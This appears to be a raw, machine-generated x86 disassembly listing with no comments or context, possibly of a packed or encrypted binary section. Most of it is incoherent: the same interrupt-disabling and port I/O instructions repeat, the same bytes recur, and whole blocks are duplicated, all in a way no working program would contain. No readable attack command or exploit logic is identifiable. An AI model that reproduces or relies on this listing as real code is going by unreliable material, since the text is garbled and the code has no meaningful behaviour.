xor eax 0x8017e30c
adc [ ebx + eax * 2 ] 0x6a
push 0xfffffffa
cli
cli
lodsd [ esi ]
das
xchg esi eax
imul ebp [ edx + 0x6a ] 0x6a
xor ebx 0x40
push 0x6a
cli
pop ecx
stosb [ edi ]
mov [ 0xfffffffffafafaa9 ] eax
cli
cli
cli
cli
xor [ ebx + 0x6a6a6166 ] al
cli
cli
cli
cli
cli
cmp [ ebp + 0x6a6aeafc ] edx
push 0xffffffe3
in al dx
stosb [ edi ]
push 0x6a
push 0x51
test eax 0x8413ef65
xchg ebp eax
xchg ebp eax
pop es
xor eax [ edx - 0x5056a6b ]
push 0x6a
cli
cli
cli
cli
cli
cli
push ecx
lodsd [ esi ]
adc [ esi + 0x6f ] 0x6a
sub_461001
out 0x2f eax
mov esi 0x79f1833a
push 0x6a
cli
cli
cli
cli
test eax 0xcb2e1fa
jecxz r-xdata
0x6a600c83 0xfa6a
cli
cli
cmp [ eax ] eax
outsb
add ch [ edx + 0x5a ]
push 0x6a
add bh [ edx - 0x7c959495 ]
mov ebp [ esi + 0x6a ]
push 0xffffffe7
imul ebp [ edx + 0x6a ] 0xee65a951
jge r-xdata
mov edx 0xa227e30c
loope r-xdata
push 0x3f
loope r-xdata
jbe r-xdata
cli
push 0x6a
loope r-xdata
cli
cli
or al 0xe3
das
mov ah 0x32
add [ ebx + eax * 4 + 0x59 ] al
lea edx [ ebp - 0x7c6e966b ]
ficomp [ ebx - 0x5056a6b ]
jecxz r-xdata
pop ecx
stosb [ edi ]
or al 0xe3
aaa
fadd [ ebx + 0x6a6a75ed ]
cli
cli
xchg ebp eax
pop ds
mov ss [ ebp + 0x6a02763d ]
0x83396a6a 0x82a2
cli
jecxz r-xdata
xor [ eax + ebp * 2 + 0x3afa6a6a ] 0xffffff95
pop ds
or [ eax + 0x336a6a59 ] 0xe1
and eax 0x8b618366
xchg ebp eax
xchg ebp eax
cli
cli
push ecx
sub al 0x5e
out dx eax
xlat
pop esp
push 0x6a
cmp al [ ebx + 0x6a6a6923 ]
cli
cli
cmp al [ ebx + 0x6a6a6cd9 ]
cli
cli
cli
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cli
cli
cli
out dx eax
xlat
mov [ ebp + 0x35aa5995 ] edx
xor al 0x31
mov [ 0xffffffffb2e1faa9 ] eax
or al 0xe3
das
cli
cli
cli
cli
cli
cli
cli
cli
cli
jecxz r-xdata
push 0x3d
xchg esi eax
push 0x6a
push 0xffffff82
pop ds
adc [ ebp - 0x702f7c6b ] 0x95
aas
jpe r-xdata
cmp [ edx - 0x59595b7 ] 0xfffffffa
cli
cli
cli
cli
cli
loope r-xdata
push 0xffffffe9
push ss
dec esi
jbe r-xdata
fisubr [ edx + 0x6a ]
push 0xffffff82
xchg [ fs : ebp - 0x21131c6b ] dl
push 0x6a
push 0xffffffe9
scasb [ edi ]
push edx
out 0x2f eax
xchg [ edx ] bh
lodsd [ esi ]
das
xchg [ ecx ] bl
add cl [ edi ]
push es
lodsd [ esi ]
das
0x6a585906 0xb995
loope r-xdata
push 0x6a
cmp al 0x3d
add [ edx - 0x59595b0 ] 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
cli
out dx al
fidiv [ edx + 0x6a ]
push 0x0
push 0xffffff95
cld
push 0xfffffffa
cli
cli
cli
add ch [ esi + 0x6b ]
push 0x6a
sub [ ebx ] 0x78
push 0x6a
cli
loope r-xdata
sbb [ edx - 0x56a6a67 ] 0xfffffffa
dec esi
inc edx
or [ esi + 0x336a6a42 ] 0x83
lodsd [ esi ]
inc edi
push 0x6a
cli
cli
cli
cli
cli
cli
cli
cli
cli
add [ 0xc1a0032 ] al
jecxz r-xdata
cli
cli
xor [ ebx ] ecx
aaa
0x83311f00 0x4e56
push 0x6a
cli
add [ edx + 0x33 ] bl
adc [ edx + 0x67 ] 0x6a
jecxz r-xdata
push 0xffffff83
loope r-xdata
out dx eax
mov cl 0x65
out dx al
dec esi
push esi
xor al [ eax ]
or [ edx - 0x7c9595a8 ] 0xdc
outsd
push 0x6a
or al 0xe3
pop ds
xchg ebp eax
cli
cli
cli
cli
add bh bh
pop ebx
std
cmp eax 0x831a2ce3
r-xdata
xchg ebp eax
inc edx
xchg edi eax
xchg ebp eax
xchg ebp eax
xor [ eax - 0x56a6a6e ] 0xfffffffa
pop eax
push 0xffffff95
mov ecx 0xb1efb2e1
out dx al
dec esi
jle r-xdata
push 0x6a
cli
cli
cli
cli
cli
cli
push ecx
lodsd [ esi ]
adc [ esi + 0x6f ] 0x6a
pop es
xor eax 0x8017e30c
adc [ ebx + eax * 2 ] 0x6a
push 0xfffffffa
cli
cli
lodsd [ esi ]
das
xchg esi eax
imul ebp [ edx + 0x6a ] 0x6a
xor ebx 0x40
push 0x6a
cli
pop ecx
stosb [ edi ]
mov [ 0xfffffffffafafaa9 ] eax
cli
cli
cli
cli
xor [ ebx + 0x6a6a6166 ] al
cli
cli
cli
cli
cli
cmp [ ebp + 0x6a6aeafc ] edx
push 0xffffffe3
in al dx
stosb [ edi ]
push 0x6a
push 0x51
test eax 0x8413ef65
xchg ebp eax
xchg ebp eax
pop ecx
stosb [ edi ]
sub [ 0xfffffffffa6a6a73 ] 0xfffffffa
cli
cli
cli
push ebx
dec esi
jle r-xdata
xor eax [ edx - 0x5056a6b ]
cli
cli
out 0x2f eax
mov edx 0xb61f953a
add [ ebx ] 0x7a
push 0x6a
cli
cmp al 0xe1
fwait
out dx eax
pushfd
out dx al
nop
insd
push 0x6a
pop ecx
mov [ 0x6f92832b ] eax
push 0x6a
cli
cli
cli
cli
out dx al
inc esp
push 0x6a
add dh dl
push eax
push 0x6a
and ecx 0x44
sub_461158
loope r-xdata
lodsd [ esi ]
bound edi [ edx ]
and [ edi + 0x6f ] 0x6a
push 0xfffffffa
cli
add [ ebp - 0x80 ] 0x95
xchg ebp eax
add dl [ edx - 0x69 ]
inc eax
clc
sbb eax 0xffffff9e
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cli
loope r-xdata
xchg ebp eax
fiadd [ ebx - 0x6a6a7aa9 ]
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
jmp r-xdata
cli
cli
cli
cli
add bh bh
pop ebx
std
cmp eax 0x831a2ce3
r-xdata
sub [ ecx + 0x4f ] 0x6a
push 0x33
xor ebx [ ecx - 0x56 ]
sub al [ ebx + 0x6a6a4996 ]
cli
cli
cli
loop r-xdata
xchg ebp eax
cld
push 0x6a
cmp al 0x3d
add [ edx - 0x59595b0 ] 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
cli
out dx al
fidiv [ edx + 0x6a ]
push 0x0
push 0xffffff95
push 0xfffffffa
cli
cli
cli
add ch [ esi + 0x6b ]
push 0x6a
sub [ ebx ] 0x78
push 0x6a
cli
loope r-xdata
dec esi
push esi
xor al [ eax ]
or [ edx - 0x7c9595a8 ] 0xdc
outsd
push 0x6a
or al 0xe3
pop ds
sub_4612cb
mov ch 0x95
xchg ebp eax
aas
pop edx
jpe r-xdata
add [ edi + edi * 2 + 0x6a ] 0x6a
cli
cli
cli
cli
jmp r-xdata
cli
out dx eax
mov [ 0x6a7aee65 ] eax
push 0x6a
out dx eax
stosb [ edi ]
out dx eax
mov eax [ edx - 0x5c106a6b ]
out dx eax
mov eax [ edx - 0x55106a6b ]
and [ esi - 0x56a6a7e ] 0xfffffffa
cli
cli
pop ecx
stosb [ edi ]
cmp bh [ edx ]
cmp bh [ edx ]
cmp [ ebp + 0x5bf6837d ] edx
push 0x6a
cli
xchg ebp eax
jge r-xdata
cli
out dx eax
stosb [ edi ]
out dx eax
mov dh 0x46
sbb bx 0x63
push 0x6a
cli
cli
cmp al 0x83
add [ esi + 0x6a ] 0xfafafa6a
cli
loope r-xdata
cli
cli
cli
loope r-xdata
cmpsb [ esi ] [ edi ]
adc [ ebp - 0x505056b ] 0xfa
sbb bh [ edx + 0x6a ]
push 0xfffffffa
cli
cli
loope r-xdata
push 0x33
out dx eax
stosb [ edi ]
sbb edi 0xffffff91
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
neg [ ebx + 0x6a ]
push 0xfffffffa
jmp 0x6bc4600e
fist [ ecx - 0x5056a6b ]
cmp [ esi - 0x56a6a74 ] 0xfffffffa
cli
rcl [ ebp + 0xc6a6a7f ] 0x1
jecxz r-xdata
push ds
sub dh 0x5b
push 0x6a
or [ edi + ebx * 2 + 0x6a ] 0x6a
loope r-xdata
pop ebx
inc ebx
jle r-xdata
mov al [ ebx + 0x6a6a778a ]
cli
cli
aas
loope r-xdata
push 0x6a
out 0x17 eax
shl bh cl
out 0xda eax
xchg edi eax
xchg ebp eax
xchg ebp eax
xor [ ecx ] 0x5c
push 0x6a
cli
inc esi
pop edx
lodsb [ esi ]
cli
cli
cli
cli
cli
cli
loope r-xdata
push 0xffffff83
xchg edi eax
xchg edx eax
xchg ebp eax
xchg ebp eax
cli
cli
xchg ebp eax
push ds
dec esi
jb r-xdata
push 0x6a
or al 0xe3
jle r-xdata
jmp 0x1ac94551
ficom [ edx - 0x18c56a6b ]
xchg esi eax
jecxz r-xdata
cli
cli
cli
cli
cli
cli
cli
or [ edx + ecx * 2 + 0x6a ] 0x6a
cli
cli
cli
cli
cli
cli
cli
cli
out 0x2e eax
pop edx
jb r-xdata
lodsb [ esi ]
mov bh 0x95
xchg ebp eax
jmp 0x43c979b9
cli
xchg ebp eax
cmp al 0x52
sbb [ edx + eax * 4 ] 0xffffff95
xchg ebp eax
jecxz r-xdata
pop edi
push 0x6a
jecxz r-xdata
das
xchg [ edx ] bh
and [ ecx - 0x56a6a7e ] 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
cli
cli
jmp 0xfffffffffac97c5c
xchg ebp eax
cmp ah bh
mov fs cx
das
xchg edx eax
add [ ecx - 0x56a6a7e ] 0xfffffffa
cli
xchg ebp eax
pop ds
mov dh 0x83
or [ ecx + 0x6a ] ebx
push 0xffffffeb
xchg dl ah
push 0x27d36a6a
xor [ edx + 0x6a ] ch
sub [ ecx + 0x69 ] 0x6a
push 0xfffffffa
cli
cli
cli
cli
cli
out 0xef eax
sub_461542
dec esp
push 0x6a
loope r-xdata
xchg ebp eax
pop ds
and bl 0x2f
xchg edx eax
or [ ecx - 0x59595a7 ] 0xfffffffa
bound eax [ ebx - 0x6a6a7f33 ]
pop ecx
mov cl 0x83
mov ebp 0xfa959593
cli
cli
cli
cli
xchg ebp eax
std
0x3a6a6a6a 0x6aad
push 0xfffffffa
out dx eax
add ebx [ esi + 0x6a ]
push 0xffffff83
pushfd
xchg edi eax
xchg ebp eax
xchg ebp eax
cli
add [ ecx ] cl
loope r-xdata
push 0x6a
cli
or al 0x53
pop esi
jpo r-xdata
push 0xffffff83
xlat
pop edx
xor edx 0x6c
push 0x6a
cmp eax 0x958f0582
xchg ebp eax
loope r-xdata
cli
cli
cli
cli
cli
xor esp ecx
xchg edx eax
and [ esi + 0x656a6a47 ] 0xffffffe4
xchg [ ecx + 0x6a ] ah
push 0xffffff83
inc eax
sahf
xchg ebp eax
xchg ebp eax
cli
cli
cli
out dx al
test eax 0x8395958d
mov al 0x41
push 0x6a
cli
cli
cli
cli
cli
cli
adc esp 0x65
push 0x6a
adc edi 0x5a
pop ecx
push 0x6a
cli
cli
cli
cli
cli
cli
aas
loope r-xdata
or al 0xe3
push 0x6a
out 0x2f eax
mov [ 0xffffffff9595003a ] al
pop ds
0x83a237e3 0x6599
push 0x6a
cli
or al 0xe3
daa
sahf
add [ edi - 0x56a6a75 ] 0xfffffffa
out dx eax
stosb [ edi ]
cmp [ ecx - 0x6e ] 0xffffff95
xchg ebp eax
cli
cli
xchg ebp eax
pop ds
bound eax [ edx - 0x6a6a494f ]
xor esi [ ebx ]
out dx eax
stosb [ edi ]
sbb ebx 0x46
push 0x6a
cli
xor eax [ ebx + 0x6a6a62aa ]
cli
cli
cli
add [ ebx - 0x76 ] 0xffffff95
xchg ebp eax
cli
sub esp eax
jpo r-xdata
aaa
xchg esi eax
xor [ ebx + 0x6a6a58cf ] eax
cli
cli
cli
cli
cli
cli
cli
cli
cli
inc ecx
mov [ 0xffffffff8268833d ] al
xchg ebp eax
xchg ebp eax
add ch [ edx + 0x7a ]
or eax 0xfa6a6a58
xor al [ eax ]
dec edx
or al 0xe3
das
mov [ ebx + 0x6a6a6bd1 ] es
cli
cli
cli
cli
out 0xe7 eax
out 0x97 al
xchg ebp eax
xchg ebp eax
xor [ esi + 0x4c ] 0x6a
push 0xffffff83
inc ebp
pop ebx
push 0x6a
cli
pop ecx
stosb [ edi ]
xor al 0x31
mov [ 0xfffffffffafafaa9 ] eax
cli
cli
or al 0xe3
daa
retn 0x1183
sub_461562
push 0x956a6b6a
pop ds
and bl 0x2f
xchg edx eax
or [ ecx - 0x59595a7 ] 0xfffffffa
push 0xfffffffa
out dx eax
add ebx [ esi + 0x6a ]
push 0xffffff83
pushfd
xchg edi eax
xchg ebp eax
xchg ebp eax
cli
add [ ecx ] cl
loope r-xdata
push 0x6a
cli
or al 0x53
pop esi
jpo r-xdata
push 0xffffff83
xlat
pop edx
xor edx 0x6c
push 0x6a
cmp eax 0x958f0582
xchg ebp eax
loope r-xdata
cli
cli
cli
cli
cli
xor esp ecx
xchg edx eax
and [ esi + 0x656a6a47 ] 0xffffffe4
xchg [ ecx + 0x6a ] ah
push 0xffffff83
inc eax
sahf
xchg ebp eax
xchg ebp eax
cli
cli
cli
out dx al
test eax 0x8395958d
mov al 0x41
push 0x6a
cli
cli
cli
cli
cli
cli
adc esp 0x65
push 0x6a
adc edi 0x5a
pop ecx
push 0x6a
cli
cli
cli
cli
cli
cli
aas
loope r-xdata
or al 0xe3
push 0x6a
out 0x2f eax
mov [ 0xffffffff9595003a ] al
pop ds
0x83a237e3 0x6599
push 0x6a
cli
or al 0xe3
daa
sahf
add [ edi - 0x56a6a75 ] 0xfffffffa
out dx eax
stosb [ edi ]
cmp [ ecx - 0x6e ] 0xffffff95
xchg ebp eax
cli
cli
xchg ebp eax
pop ds
bound eax [ edx - 0x6a6a494f ]
xor esi [ ebx ]
out dx eax
stosb [ edi ]
sbb ebx 0x46
push 0x6a
cli
xor eax [ ebx + 0x6a6a62aa ]
cli
cli
cli
add [ ebx - 0x76 ] 0xffffff95
xchg ebp eax
cli
sub esp eax
jpo r-xdata
aaa
xchg esi eax
xor [ ebx + 0x6a6a58cf ] eax
cli
cli
cli
cli
cli
cli
cli
cli
cli
inc ecx
mov [ 0xffffffff8268833d ] al
xchg ebp eax
xchg ebp eax
add ch [ edx + 0x7a ]
or eax 0xfa6a6a58
xor al [ eax ]
dec edx
or al 0xe3
das
mov [ ebx + 0x6a6a6bd1 ] es
cli
cli
cli
cli
out 0xe7 eax
out 0x97 al
xchg ebp eax
xchg ebp eax
xor [ esi + 0x4c ] 0x6a
push 0xffffff83
inc ebp
pop ebx
push 0x6a
cli
pop ecx
stosb [ edi ]
xor al 0x31
mov [ 0xfffffffffafafaa9 ] eax
cli
cli
or al 0xe3
daa
retn 0x1183
sub_461674
push 0x6a
cli
cli
cli
cli
cli
jecxz r-xdata
bound esp [ ebp - 0x11 ]
xchg edx eax
cmp [ ebp + esi * 2 + 0x17536a6a ] 0xffffff96
add [ esi ] 0x4e
push 0x6a
cli
cli
cli
cli
cli
cmp [ esp + ecx ] edi
push ebx
push 0x22836a6a
inc esi
push 0x6a
cli
cli
cli
cli
xchg ebp eax
cmp al 0xe
add [ ecx - 0x595959c ] 0xfffffffa
cli
out dx eax
adc [ edx + 0x6a ] ecx
push 0xffffffe7
das
cmp ah cl
lodsb [ esi ]
adc al 0x46
push 0x6a
xor ebp edi
stosb [ edi ]
or [ eax ] 0x4a
push 0x6a
out dx eax
daa
outsd
push 0x6a
pop ecx
stosb [ edi ]
xor al 0x31
test eax 0xfafafafa
cli
xchg ebp eax
std
0x836a6a6a 0x49df
push 0xffffffe1
mov ebp 0x6a770683
push 0xfffffffa
loope r-xdata
pop ebx
push 0x6a
cli
pop ecx
stosb [ edi ]
xor al 0x31
mov [ 0xfffffffffafafaa9 ] eax
cli
cli
or al 0xe3
daa
retn 0x1183
and ecx 0xffffff87
xchg ebp eax
xchg ebp eax
xchg ebp eax
pop ds
mov ss [ ebp + 0x26e00ba ]
push 0x5a
push 0x6a
adc ebx 0xffffffb7
xchg ebp eax
xchg ebp eax
cli
cmp al 0x3a
or al 0xe3
aas
mov [ ebx ] cs
daa
0x95b39882 0x95
adc eax 0x7c
push 0x6a
cli
cli
cli
cli
cli
cli
cli
jmp r-xdata
or [ edx + 0x6a ] edi
push 0xffffffe1
sbb dl [ esi - 0x7d ]
mov eax [ 0x65959589 ]
out dx eax
dec edx
js r-xdata
out dx eax
sub_4616fd
xor al [ ebx + 0x6a6a6323 ]
cli
cli
cli
cli
cli
cli
cli
xor eax [ ebx + 0x6a6a71b4 ]
out dx al
add ebp [ eax + 0x6a ]
push 0xffffff83
and al [ esi + 0x6a ]
push 0xfffffffa
cli
cli
cli
xchg ebp eax
cmp al 0xe
add [ ecx - 0x595959c ] 0xfffffffa
cli
out dx eax
adc [ edx + 0x6a ] ecx
push 0xffffffe7
das
cmp ah cl
lodsb [ esi ]
adc al 0x46
push 0x6a
xor ebp edi
stosb [ edi ]
or [ eax ] 0x4a
push 0x6a
out dx eax
daa
outsd
push 0x6a
pop ecx
stosb [ edi ]
xor al 0x31
test eax 0xfafafafa
cli
xchg ebp eax
std
0x836a6a6a 0x49df
sub_46192d
cmp al 0x3d
jecxz r-xdata
xchg ebp eax
xchg ebp eax
add [ eax + ebx * 4 ] 0xffffff95
xchg edx eax
jecxz r-xdata
adc [ ebx + 0x6a ] dh
jecxz r-xdata
xchg ebp eax
cmp eax 0x6ae2ece3
add al 0x98
xchg ebp eax
sahf
jecxz r-xdata
xor al 0x31
test eax 0xfafafafa
out dx eax
pushfd
out dx al
mov al [ 0x29595bc ]
xchg [ ecx - 0x7cc303f7 ] edx
fsubr [ edx + 0x6a ]
push 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
loope r-xdata
add esp 0xffffffb5
cmp [ ebx + 0x6a6a64b0 ] eax
cli
cli
cli
out 0xe7 eax
ficom [ edx - 0x7d6a6b ]
fwait
xchg ebp eax
xchg ebp eax
xor ebp ecx
xchg edx eax
imul esp [ ebp - 0x12 ] 0x31
pop edx
push 0x6a
or [ ecx - 0x7d9595b3 ] 0x10
jae r-xdata
cli
cli
out 0x17 eax
mov dl 0xe7
out 0xda eax
xchg edi eax
xchg esi eax
shr [ edx + 0x6a ] cl
push 0x6a
enter 0x37e3 0x96
or ebx 0x62
push 0x6a
out 0x3 al
adc [ ebp + 0x35aa5995 ] 0x34
xor [ ecx - 0x5050506 ] ebp
loop r-xdata
xchg ebp eax
xchg ebp eax
out dx eax
add edi [ ebx + 0x6a ]
push 0x41
stosd [ edi ]
cmp [ ebp + 0x4f ] 0x6a
push 0x65
out dx al
adc ebp 0x4a
push 0x6a
cli
cmp [ esi + 0x40 ] 0x6a
push 0x33
out dx eax
stosb [ edi ]
out dx eax
0x836a6a42 0xb5c4
xchg [ ebp - 0x505056b ] dl
cli
cli
cli
cli
cli
cli
cli
cmp dl [ ebp - 0x1018b9c3 ]
adc [ esi - 0x7dc56a6b ] 0xac
jno r-xdata
push 0xffffffef
stosb [ edi ]
out dx al
mov bl 0xbc
xchg ebp eax
xchg ebp eax
adc dh 0xb2
xchg ebp eax
xchg ebp eax
loope r-xdata
push 0x6a
sbb [ edx - 0x56a6a63 ] 0xfffffffa
cli
cli
cli
cli
cli
loope r-xdata
cli
cli
cli
jmp 0x8467524
push 0xffffff83
mov esi [ ebx + 0x6a ]
push 0x0
pop ds
or al 0xe3
aas
xchg [ eax ] dh
or al 0xe3
aas
test [ eax ] al
pop es
loope r-xdata
xchg edi eax
push 0x6a
add [ esi - 0x7d ] ch
int3
out dx al
or al 0xe3
aas
0xe30cb859 0x983f
xor [ eax ] al
push es
or al 0xe3
aas
mov [ 0xffffffffea83bae1 ] al
popfd
xchg ebp eax
xchg ebp eax
cli
cli
xor [ eax ] eax
push ds
or al 0xe3
aaa
int3
sub_461af9
push 0x6a
cli
cli
cli
cli
cmp ah cl
lodsb [ esi ]
sub [ ebp - 0x166a6a63 ] 0xae
add [ eax ] 0xff96
xchg ebp eax
xchg ebp eax
add edi 0xffffffb7
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cmp [ ebp + 0x336a6a42 ] 0xef
stosb [ edi ]
out dx al
ror [ edx + ebp * 2 + 0x6a ] 0x59
stosb [ edi ]
or ecx 0x4c
push 0x6a
add [ ebx + 0xc ] ch
jecxz r-xdata
out dx al
mov [ 0x6a7f0783 ] eax
push 0xfffffffa
cli
cli
cli
add [ ecx ] cl
or al 0xe3
das
jl r-xdata
dec esi
sub [ ecx - 0x56 ] bl
cmp bh [ edx ]
out 0xe6 eax
dec esi
imul [ edx + 0x6a ]
push 0xffffff83
sahf
inc ebx
push 0x6a
cli
cli
cli
or al 0xe3
das
mov esi 0x958f3e83
xchg ebp eax
cli
cli
imul ebp [ edi ] 0x953a3b96
pop ds
mov es [ ebx + 0x6a6a4672 ]
das
xchg esi eax
cmp edi [ edx ]
xchg ebp eax
test al 0xc
jecxz r-xdata
or al 0xe3
aaa
dec esp
loope r-xdata
jb r-xdata
cli
push 0x6a
or al 0xe3
aaa
mov dl 0xc
jecxz r-xdata
xor [ ebx + 0x396a6a4e ] 0xffffffe7
out dx eax
0x9597
push 0x6a
out 0x3f eax
sahf
xor [ ebx ] 0x67
push 0x6a
xchg ebp eax
pop ds
bound eax [ ebx - 0x6a6a49bb ]
cli
fsubr [ gs : ebp - 0x7d ]
inc edi
sahf
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cmp bh [ ecx ]
cmp [ ebx + 0x6a6a69da ] eax
cli
cli
cli
cli
cli
sbb dh 0xbe
xchg ebp eax
xchg ebp eax
jmp 0x7a4682cb
inc edx
sbb esi 0x4d
push 0x6a
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cmp al [ ebx - 0x6a6a6791 ]
cli
cli
jmp 0xffffffff83b0addc
sub_462703
push 0xffffffe7
out dx eax
loope r-xdata
sahf
pop ecx
xchg ebp eax
loope r-xdata
scasb [ edi ]
xchg esi eax
xchg ebp eax
xchg ebp eax
cmp al [ edx + 0x6a6a6489 ]
sub bh [ edx ]
sbb [ ebp + 0x7e ] 0x6a
push 0xfffffffa
pop ecx
stosb [ edi ]
jecxz r-xdata
or [ esi - 0x1895958f ] 0xffffffef
out dx eax
mov cl 0x83
push ss
dec esi
push 0x6a
cli
cli
cli
cli
cli
loope r-xdata
lodsd [ esi ]
das
xchg edx eax
pop ecx
pop eax
xlat
mov ds [ ecx - 0x5d ]
loope r-xdata
mov [ 0xffffffff958a0d82 ] al
cmp edi [ 0xfffffffffd9592e1 ]
retn 0x6a6a
xchg edx eax
xchg ebp eax
std
sahf
loope r-xdata
xchg ebp eax
cmp [ ebx + 0x6a6a4fdb ] eax
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
xchg ebp eax
std
into
push 0x6a
push 0xffffff83
lodsb [ esi ]
das
nop
push 0xffffff95
cmp al 0x22
mov ecx 0xb2498390
xchg ebp eax
xchg ebp eax
cli
cli
out 0x2f eax
sahf
cmp ch [ ebp + 0x191f9e2f ]
prefetcht0 [ ebp * 4 + 0x5859922f ]
sub_4627db
out 0x2e eax
dec esi
dec esi
cmp ah [ ebp - 0x23 ]
0x881fe30c 0xe134
mov ah 0xc
jecxz r-xdata
or al 0xe3
das
mov dl 0x32
add [ edi ] al
loope r-xdata
insd
cmp cl [ ecx ]
sub eax 0x6c3c8368
push 0x6a
cli
cli
cli
cli
cli
cli
loope r-xdata
mov es [ ebx + 0x6a6a7e41 ]
cli
cli
cli
cli
cli
cli
xchg ebp eax
std
out dx al
push 0x6a
push 0x59
stosb [ edi ]
sbb [ esp + ecx * 4 - 0x6b ] 0xffffff95
cli
cli
aas
loope r-xdata
or [ ebx - 0x56a6a68 ] 0x3b
cmp [ edi + 0x6a669183 ] edi
push 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
xor al [ eax ]
xor [ ebx + 0x6a6a6309 ] al
or al 0xe3
pop ss
pushfd
or al 0xe3
aas
add [ ss : ebx ] al
xor [ eax ] al
add al 0x83
push eax
nop
xchg ebp eax
xchg ebp eax
cli
cli
cli
cmp [ ebx + eax * 4 ] edi
in al 0x81
xchg ebp eax
xchg ebp eax
cli
cli
cli
or al 0xe3
aas
mov dh 0x30
add [ esi ] al
or al 0xe3
aas
mov ah 0x30
add [ edi ] cl
or al 0xe3
aas
mov dh [ eax ]
cmp [ ebx + 0x60 ] 0x6a
push 0x59
stosb [ edi ]
sub al [ ebx + 0x6a6a70e1 ]
xchg ebp eax
cmp al 0x56
xor [ ebx + 0x7e ] 0x6a
push 0xfffffffa
and [ edi - 0x6a959593 ] 0xec
salc
push 0x6a
push 0xffffffe7
out dx eax
mov esi 0x3a959597
cmp [ ebp - 0x281c81c4 ] edx
mov esi 0xef959597
stosb [ edi ]
out dx eax
xchg edx eax
jo r-xdata
adc [ esi ] 0x4e
push 0x6a
cli
cli
cli
cli
cli
loope r-xdata
xor [ edx - 0x5d ] 0xffffff95
xchg ebp eax
cli
cli
cli
cli
cli
cli
cli
cli
jmp 0x6a9475e9
push 0x6a
xor [ eax + edi * 4 - 0x6b ] 0xffffff95
cli
cli
cli
cli
cli
in al dx
insd
xchg esi eax
xchg ebp eax
xchg ebp eax
jmp 0x6ac0771a
push 0x2a
xor eax 0xa9a331
imul eax [ edx ] 0x6a
push 0x6a
0x83621f95 0xbf0d
mov [ 0xffffffff958a0d82 ] al
xchg ebp eax
cmp [ ebx + 0x6a6a4fdb ] eax
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
xchg ebp eax
std
into
push 0x6a
push 0xffffff83
cmp edi [ 0xfffffffffd9592e1 ]
retn 0x6a6a
sub_462c3c
push 0x6a
push 0xffffff83
cmp [ eax + 0x6a ] dh
push 0xfffffffa
cli
cli
cli
cli
cli
cli
loope r-xdata
pop eax
jo r-xdata
or al 0xe3
aaa
nop
loope r-xdata
jecxz r-xdata
push 0xffffff83
in eax dx
sahf
xchg ebp eax
xchg ebp eax
or al 0xe3
das
mov al 0xe1
lodsb [ esi ]
or al 0xe3
das
mov dh 0x32
add [ ecx ] bl
xchg edx eax
or al 0xe3
pop ss
mov ah 0x83
popfd
imul ebp [ edx + 0x6a ] 0xfffffffa
cli
cli
cli
cli
cli
cli
cli
sub [ ebx + 0x339595bb ] 0xef
stosb [ edi ]
out dx al
pop es
jo r-xdata
sub ebp 0xffffff9e
or al 0xe3
aaa
xchg esi eax
pop ecx
mov cl 0xc
jecxz r-xdata
sbb [ ebp + 0x1905b22f ] ch
add eax 0xb085830c
mov edx 0x2fe30c32
mov eax 0xc320f00
jecxz r-xdata
xchg ebp eax
das
mov dl 0x5
sbb [ 0xffffffffb085830c ] eax
push 0x39
xchg ebp eax
cld
das
xchg [ edi ] ah
and [ edi ] edi
lodsd [ esi ]
das
mov esi 0x18090327
lodsd [ esi ]
xchg esp eax
sub [ ebp + 0x4a ] 0x6a
push 0xfffffffa
xor [ eax ] al
sbb eax 0xa63fe30c
xor [ eax ] al
sbb [ ebx ] cl
das
xchg ebp eax
cli
cli
cli
cli
cli
cli
add [ edx - 0x19 ] bh
das
mov edx 0x6a601d83
push 0xffffff82
popad
scasb [ edi ]
xchg ebp eax
xchg ebp eax
jmp 0x29c99374
mov esi 0x95a35d83
xchg ebp eax
cmp eax 0x9f836800
mov ebx 0xadfa9595
das
cmp [ edi ] 0x21
cmp al 0xad
sub_462d30
push 0xffffff83
mov ch 0xa2
xchg ebp eax
xchg ebp eax
cli
sub bl 0x6e
push 0x6a
xor eax 0x6a648e83
push 0xfffffffa
cli
cli
cli
cli
cli
sbb [ eax + eax * 4 - 0x5056a6b ] 0xfffffffa
cli
cli
cli
cli
cli
xor al 0x31
loope r-xdata
xchg ebp eax
out dx al
test eax 0xb1ef9595
sub [ edi - 0x595959f ] 0xfffffffa
cli
cli
cli
loope r-xdata
aaa
test eax 0xdc653dfa
nop
or eax 0xffffff92
xchg ebp eax
xchg ebp eax
out 0x2f eax
out dx al
sub ecx 0xffffff94
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cli
cli
cli
cli
xor al 0x31
out dx eax
stosb [ edi ]
xor [ edi - 0x106a6a67 ] 0xffffffaa
out dx eax
arpl [ ebp + edx * 4 + 0x7f0c8395 ] ax
push 0x6a
cli
cli
cli
loope r-xdata
or al 0x83
test [ eax - 0x5056a6b ] esi
cli
cli
cli
cli
add [ edx - 0x19 ] bh
das
or al 0xe3
das
mov dl 0xe1
stosd [ edi ]
sub [ eax - 0x6b ] 0xffffff95
xchg ebp eax
cli
xor al [ eax ]
jae 0xffffffff95dbb99c
xchg ebp eax
cli
cli
cli
cli
cli
cli
sbb ebx 0xffffffac
xchg ebp eax
xchg ebp eax
cli
cli
cli
cli
cli
cli
sub [ ebx - 0x166a6a59 ] 0xae
sub al [ edx ]
iretd
dec esi
outsb
loopne r-xdata
sub [ ecx + 0x516a6a62 ] 0xad
cmp [ esi - 0x49 ] 0xffffff95
xchg ebp eax
or al 0xe3
pop ss
stosb [ edi ]
loope r-xdata
pop ebp
push esp
sahf
cmp eax 0x6aeeece3
push 0x6a
cmp bl 0xa7
xchg ebp eax
xchg ebp eax
add ah [ edi - 0x7c53e15a ]
cmp eax 0xfa959581
cli
cli
cli
cli
cli
cli
cli
cli
loope r-xdata
sub al [ ebx - 0x6a6a7854 ]
out 0xef eax
push cs
xchg ebp eax
